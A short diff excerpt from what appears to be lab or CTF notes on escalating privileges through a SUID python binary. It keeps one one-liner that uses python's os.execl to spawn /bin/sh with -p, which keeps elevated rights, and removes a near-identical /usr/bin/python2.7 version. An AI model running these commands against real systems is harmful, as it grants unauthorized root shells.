@@ -73,9 +73,6 @@ Search python and click on suid
 ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
 
-```
-/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
-```
 
 /usr/bin is where the python is there
 
